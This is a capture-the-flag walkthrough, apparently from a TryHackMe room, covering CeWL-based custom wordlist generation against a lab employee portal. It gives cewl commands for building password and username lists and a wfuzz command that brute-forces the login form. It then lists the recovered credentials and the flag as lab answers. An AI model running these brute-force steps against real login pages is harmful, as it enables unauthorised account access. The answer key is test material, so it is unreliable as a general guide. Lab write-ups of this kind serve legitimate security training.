# Day_04 [Brute-Forcing] Baby, it's CeWLd outside

+ Deployable Machine: Yes
+ Website: Yes

Description: The AntarctiCrafts company, globally renowned for its avant-garde ice sculptures and toys, runs a portal facilitating confidential communications between its employees stationed in the extreme environments of the North and South Poles. However, a recent security breach has sent ripples through the organisation. After a thorough investigation, the security team discovered that a notorious individual named McGreedy, known for his dealings in the dark web, had sold the company's credentials. This sale paved the way for a random hacker from the dark web to exploit the portal. The logs point to a brute-force attack. Normally, brute-forcing takes a long time. But in this case, the hacker gained access with only a few tries. It seems that the attacker had a customised wordlist. Perhaps they used a custom wordlist generator like CeWL. Let's try to test it out ourselves!

> IP: [10.10.236.233]

## LEARNING OBJECTIVES

1. What is CeWL?
2. What are the capabilities of CeWL?
3. How can we leverage CeWL to generate a custom wordlist from a website?
4. How can we customise the tool's output for specific tasks?

## OVERVIEW

1. CeWL (pronounced "cool") is a custom word list generator tool that spiders websites to create word lists based on the site's content. Spidering, in the context of web security and penetration testing, refers to the process of automatically navigating and cataloguing a website's content, often to retrieve the site structure, content, and other relevant details. This capability makes CeWL especially valuable to penetration testers aiming to brute-force login pages or uncover hidden directories using organisation-specific terminology.
   1. Beyond simple wordlist generation, CeWL can also compile a list of email addresses or usernames identified in team members' page links. Such data can then serve as potential usernames in brute-force operations.

2. Why CeWL
   1. CeWL is a wordlist generator that is unique compared to other tools available. While many tools rely on pre-defined lists or common dictionary attacks, CeWL creates custom wordlists based on web page content. Here's why CeWL stands out:
      1. Target-specific wordlists: CeWL crafts wordlists specifically from the content of a targeted website. This means that the generated list is inherently tailored to the vocabulary and terminology used on that site. Such custom lists can increase the efficiency of brute-forcing tasks.
      2. Depth of search: CeWL can spider a website to a specified depth, thereby extracting words from not just one page but also from linked pages up to the set depth.
      3. Customisable outputs: CeWL provides various options to fine-tune the wordlist, such as setting a minimum word length, removing numbers, and including meta tags. This level of customisation can be advantageous for targeting specific types of credentials or vulnerabilities.
      4. Built-in features: While its primary purpose is wordlist generation, CeWL includes functionalities such as username enumeration from author meta tags and email extraction.
      5. Efficiency: Given its customisability, CeWL can often generate shorter but more relevant word lists than generic ones, making password attacks quicker and more precise.
      6. Integration with other tools: Being command-line based, CeWL can be integrated seamlessly into automated workflows, and its outputs can be directly fed into other cyber security tools.
      7. Actively maintained: CeWL is actively maintained and updated. This means it stays relevant and compatible with contemporary security needs and challenges.

## STEPS

1. Deploy Machine
2. Navigate to website "http://10.10.236.233"
   1. Employee Portal
      1. /login.php
   2. /team.php
      1. Potential usernames
         1. Isaias
         2. Daniel
         3. Job
3. Inspect source code for FORM
   1. POST: login.php
   2. INPUT: username
   3. INPUT: password
   4. ERROR: "Please enter the correct credentials"
4. CeWL
   1. Craft password list
      1. > cewl -d 2 -m 5 -w pass.txt http://10.10.236.233 --with-numbers
   2. Craft username list
      1. ***Can use the users found on team page, but will use cewl just incase there are others***
      2. > cewl -d 0 -m 5 -w users.txt http://10.10.236.233/team.php --lowercase
5. WFUZZ
   1. Lets use wfuzz to bruteforce the login
   2. > wfuzz -c -z file,users.txt -z file,pass.txt --hs "Please enter the correct credentials" -u http://10.10.236.233/login.php -d "username=FUZZ&password=FUZ2Z"
      1. RESPONSE: `000006317:   302        118 L    297 W      4442 Ch     "isaias - Happiness"`
6. LOGIN
   1. USER: isaias
   2. PASS: Happiness
7. WEBMAIL
   1. After loggin in we are redirected to the WEBMAIL page where we can what looks to be an email client
      1. Has: Inbox, Sent, Drafts, Spam, Trash
   2. Looking through the inbox we see
      1. Confidential Message FROM kevin@northpole.thm
         1. `Hi Isaias, here's your flag THM{m3rrY4nt4rct1crAft$}`

## QUESTIONS

1. What is the correct username and password combination? Format username:password
   1. `isaias:Happiness`
2. What is the flag?
   1. `THM{m3rrY4nt4rct1crAft$}`
